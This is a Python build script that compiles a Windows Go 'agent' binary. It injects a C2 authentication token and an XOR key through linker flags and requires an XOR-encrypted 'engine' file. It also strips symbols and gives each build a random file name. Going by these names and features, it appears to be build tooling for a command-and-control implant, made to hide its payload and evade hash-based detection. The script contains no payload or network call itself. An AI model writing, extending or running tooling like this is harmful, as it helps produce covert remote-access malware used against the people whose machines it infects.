#!/usr/bin/env python3
"""CI helper to build a Windows agent binary at build/agent_*.exe.

Build-time secrets are read from C2_AUTH_TOKEN and C2_AUTH_XOR, then injected
into the Go binary via linker flags. The XOR key must match agent/libjockey.enc.
"""

from __future__ import annotations

import argparse
import hashlib
import os
import random
import secrets
import string
import subprocess
import sys
from pathlib import Path


def _random_id(length: int = 8) -> str:
    return "".join(random.choices(string.hexdigits.lower(), k=length))


def _is_hex(value: str) -> bool:
    return all(character in "0123456789abcdefABCDEF" for character in value)


def main() -> int:
    parser = argparse.ArgumentParser(description="Build agent binary for CI")
    parser.add_argument("--output-dir", "-o", default="build")
    parser.add_argument("--os", default="windows")
    parser.add_argument("--arch", default="amd64")
    parser.add_argument("--token", default=os.environ.get("C2_AUTH_TOKEN", ""))
    parser.add_argument("--xor", default=os.environ.get("C2_AUTH_XOR", ""))
    parser.add_argument(
        "--dev-mode",
        action="store_true",
        help="Allow random token/key for local testing; never use in CI.",
    )
    args = parser.parse_args()

    repo_root = Path(__file__).resolve().parent
    agent_dir = repo_root / "agent"

    output_dir = (repo_root / args.output_dir).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    suffix = ".exe" if args.os == "windows" else ""
    binary_path = output_dir / f"agent_{_random_id()}{suffix}"

    c2_auth = args.token.strip()
    if not c2_auth:
        if not args.dev_mode:
            print("[-] C2_AUTH_TOKEN is not set", file=sys.stderr)
            return 1
        c2_auth = secrets.token_hex(32)
        print("[!] --dev-mode: generated a token that will not authenticate to the Worker", file=sys.stderr)

    xor_key_hex = args.xor.strip()
    if not xor_key_hex:
        if not args.dev_mode:
            print("[-] C2_AUTH_XOR is not set", file=sys.stderr)
            return 1
        xor_key_hex = secrets.token_hex(32)
        print("[!] --dev-mode: generated an XOR key; it must match libjockey.enc", file=sys.stderr)

    if len(xor_key_hex) != 64:
        print(f"[-] C2_AUTH_XOR must be exactly 64 hex chars, got {len(xor_key_hex)}", file=sys.stderr)
        return 1
    if not _is_hex(xor_key_hex):
        print("[-] C2_AUTH_XOR contains non-hex characters", file=sys.stderr)
        return 1

    enc_path = agent_dir / "libjockey.enc"
    if not enc_path.exists():
        print(f"[-] {enc_path} not found; encrypt the engine before building", file=sys.stderr)
        return 1

    env = os.environ.copy()
    env["GOOS"] = args.os
    env["GOARCH"] = args.arch

    cmd = [
        "go",
        "build",
        "-trimpath",
        "-ldflags",
        f"-s -w -X main.C2_AUTH={c2_auth} -X main.xorKeyHex={xor_key_hex}",
        "-o",
        str(binary_path),
        ".",
    ]

    print(f"[*] Building agent for {args.os}/{args.arch}")
    print(f"[+] C2_AUTH: <{len(c2_auth)} chars>")
    print(f"[+] XOR key: <{len(xor_key_hex)} chars>")
    print(f"[+] Encrypted engine: {enc_path.name} ({enc_path.stat().st_size} bytes)")
    result = subprocess.run(cmd, cwd=agent_dir, env=env)
    if result.returncode != 0:
        return result.returncode

    sha256 = hashlib.sha256(binary_path.read_bytes()).hexdigest()
    print(f"[+] SHA-256: {sha256}")
    print(f"[+] Built: {binary_path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
